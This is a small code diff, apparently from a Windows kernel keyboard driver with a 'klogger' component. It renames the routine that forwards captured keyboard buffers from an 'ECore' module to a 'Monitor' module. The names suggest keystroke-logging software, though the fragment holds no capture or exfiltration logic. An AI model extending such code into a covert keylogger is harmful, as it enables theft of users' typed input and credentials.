@@ -1,6 +1,6 @@
 #include <inc/keybrd.h>
 #include <inc/klogger.h>
-#include <inc/ecore.h>
+#include <inc/monitor.h>
 
 #include <Ntstrsafe.h>
 #include <ntddkbd.h>
@@ -349,7 +349,7 @@ VOID KbdThreadRoutine(PVOID Context)
         }
 
 		while ((!Kbd->ThreadStop) && (cBufs > 0) && ((BufEntry = KbdBuffGet(FALSE)) != NULL)) {
-			ECoreSendKbdBuf(BufEntry);
+			MonitorSendKbdBuf(MonitorGetInstance(), BufEntry);
 		}
 
         if (Kbd->ThreadStop)
